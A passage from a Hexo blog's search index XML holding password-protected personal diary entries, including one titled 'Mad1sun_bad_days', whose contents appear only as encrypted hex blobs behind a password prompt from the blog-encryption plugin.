d50f904a8f86cbb25cf3cec6aea845ca35d05c1f37abeb639e9a580ceae77a98480b32da28e79198f8192420d143adce3e0ae57483022f57045b2544d5aea7540d6595e143f9479f04d864f5d22faf0f5d696bac1ac270b0105993f53e73648e9f665bf4586290ef2ad01de44469986638817ea4471ffa22da9dd5c08cfb451dc13b274d7730af8d5481375fc5d92fd11aedb694827339481a905104ac9e577b02bd457999dde5c6bd2e723f3132ddbb3831027a87650a7ed81e6e3939063e34e75068d3c3119c104a0230555e68bc41c83416bc43d9ba117fbdc3e21a4b1d4c1bb6519ceaa89f93a3a717cb6f209681a1f9ee0df345603ec85e20a879bd638e1f55f02c253861cd873de5239c52ad5512adf59f0b167be996427af8341174bba68a6e6a4c1b3b483b76d83011ba9542b1dae9ed1edd98f5709dfcb53f3919ef948bf26e6af3fc5f81b1459e757d7360baa85ca34a9d7fdf67fcab45f1d02e86fbb96278b2d80959f8ca68f3ced2da29d2edc804fccf082268c0ea06413a91b8719e0d2b8b3013e56edcb44a8871a7e4e96d89fd02818a00aac38b3d84ca46eaeb028a82b2a7a82431881037945a9ad936d4bc610e0d9fa28a8285bf96a950d4b83682aba42864c2a9102518372ca6e27a13a0d0cb160ec49b6bd1dfaa0459a9a6f10eec050ce9c50c464ae2187723eec05534a351e27e8c572cb0c0767f153cd27f2a197a27551ef5f033df3d99275f03467f2f4527ecfd40c71b192a69f9ce15f3e28adcd0b5cadbda0cc1cd5f7c64a9cd0399106a661cfda31fb9c1921e731f828b0760af686fce696bc6152a5f5d293db1de5523154cabe986aba79451cdc4d43dca9a8f872ddad9a5c4425c38534c3f4c759c8ae57fe1e81c17117ad66e8f739144b3af96d0c012f9773dfc99a5f3074f714662fb15b0da5969f3034aa986b245e222477948ff75d0bf2ee3fb091c30669a2125aebec21b1504d3924f47533d10bb4f1218dcb63154b14f576590dd7baef797a75175618e815a1f2a240d926185c1cf43c183dd29b6aaa9e65a737901c1e13cadfe3f6bd12302672c67dbce8475b58e6380b90fbe50b431efd14052158f85d5f9d0b8c35e55797683ff8120590ba93d79d52cff3a13139972f20a448b8b21cd781578ddd058d7277e271bb656d2bd382efda2c2c793ef244e7fba6a69887a2c8806b9e43f970e3411c07e7792c5033dac2246b3cc7924a0ea847bcf36bb49ce25c7f9a5b39a48c8dc0f90b429b79f227a98b089e854ecb74d1a6e835fbda48732d2cabc49a8f9d3e4eb4f6b0c79c2a879403c875ff8fe557b71fb386427876d7932ec1bbe37edd1111849cf79177cd491cf692652e6636b3824ce3efb204ee60b77fc2c5a8c8be40c5774900a3174e880e1e89beb01d0dfb27554438dc3a8e2b8301a64026737f68c79ecb135eae96cf2edfbac2f2584bdf9a86100a08a7b2e98581a21941bbbc04f23928a99980ebff588962099a09254c0ec8a60c632606967c13c33a4d604937b49673c10d75628b9292b1cccb4df00fc26946939148fa816f1be67bfc95a60964574ccb6d7f62884350a8c767fe0ab63be3a591d20af5a6127a45c0b21708d3d385e8627480d793deecf64b37eea098aab115a4d4887c872c0a6e4240017e6f10caf36c9cb26ce363fa615124153035452af4cde81afd4e1dd973088193af7f4e3230aec10aab9f56ff0408253fb3970435fb4d43b65882ec3bc3396379fc480f6fd35c582d676eba64995759d75d7e57208b80f18695b385306fe72aa77288efad716192fd5e315d502d779ba18978fe5774fb67649ac1d256110f138d0f583ea05a95a03dcf05c4fe229c46fc353f6f0f9ac9fa2d4f06b3ace5d20d08e19639c078e25b4de57ead0c6fb0840ba997c98600e8bc799576fe48eb40fd6f0e116ba1e80c78841565ec1eb17977d3369e35cdd6f41d2533e470b823e0afa28546d9043dde92ee65579bab0f5b148826f917e1959fc40cf09651c345d5200eae2efef32417e63ea66784197f889765ba9d5813db9b2c3174557d3125c25295515671a4faee0970ca4a47e749a6ef45ae98ca524789a23ee96673f4ec2e9ad33fe60f76366bb568049a2c3c5afe12ba3f3a19990b1b8dd52b6d7b4a8f5137fee385f697ce280711712a5e51f0f060390d65a04f56242ce8bcc6c8599512a22afa59e66fb616898105b6f2ca8868f83454b6f2e5e971f90dc15d4e45909b1857164331f798da4deeda490b7aa4605e726214020e229b6aa3f401dce514ad8c2153457878d190f24bbf3885bc898b80bac5a356f07d37a28ab44</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Mad1sun的生活小日记</category>
      </categories>
  </entry>
  <entry>
    <title>Mad1sun_bad_days</title>
    <url>/2024/02/29/Mad1sun-bad-days/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="38e0b744c166c42bafc82fbb60a28f502fcbe76f1b47d8c14a91936c7530d523">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8daeae4b6ca3ddbfd01ec051499d4b50f2d43a75fc586274852cb871e33d21bf4379b6e540a918d6d3898b90acb267cfb0ddf5d64f1ee868313bdc4b97bf3d931dec88407482e7e9be8213f445488ddb3c64a5abb3900b55e21520c4210cc93c206815002449a7fbc7b0009219b65730859170cf5115e41eaf416af24e7dd41c5eb763d76b810b52c82192d44c6136bf9875c6187f53f31ced3e97e06e54ed6a1c2012ab39916707500105ec43c703a60673a17e9c85244b01e93fab8a9d5a843dbc30325250cbe69299f6c47ea651530c0103fa7b114102889a969743508ad1ab59bb99b1752ec66ca9274f0f31e09564b2c7a8a799fa953c9006fa8f8c87f53428097f9a93ff9f44b48a48b2f4dea2b5dca2db228564700a77af39853e9e3038e0cfc0a05dd7616eaee5cc49ba9d59e91a9db21d3e460e620b0e68717157dfc4a3467451810fac4776ef433560454ec5ac582e1b05ada5b3e6f0a35dc836a08463482d980762ca1207f164f1942c8e797823ddadab5e5bfdc09089d383616e467a935978e86cb26b25df7f3aab4dd221ec829f412aa584b672635631233f500bd45f2d61e7885cc5fba1fcb63d4b30e298201be459858fa078a72629beaa750e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Mad1sun的生活小日记</category>
      </categories>
      <tags>
        <tag>Mad1sun倒霉蛋的日常</tag>
      </tags>
  </entry>
</search>
